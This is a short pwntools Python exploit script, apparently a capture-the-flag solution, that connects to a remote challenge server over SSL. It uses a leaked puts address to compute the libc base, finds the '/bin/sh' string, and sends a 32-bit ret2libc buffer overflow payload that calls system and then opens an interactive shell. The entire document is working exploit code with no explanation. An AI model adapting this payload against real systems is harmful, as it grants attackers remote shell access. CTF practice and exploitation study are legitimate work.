from pwn import *

exe = ELF("chall")

libc = ELF('libc.so.6')

io = remote("bof2.hackini24.shellmates.club", 443,ssl=True)
# io = gdb.debug(exe.path,gdbscript="b* vuln+39\nc")
# io = exe.process()

libc.address = int(io.recv().split(b'\n')[1].split(b':')[1],16) - libc.symbols['puts']

bin_sh = next(libc.search(b'/bin/sh\0'))

log.info(f"libc base: {libc.address:#x}")
log.info(f"/bin/sh: {bin_sh:#x}")

payload = 76*b'A'+ p32(libc.symbols['system'])+4*b'A' +p32(bin_sh)

io.sendline(payload)

io.interactive()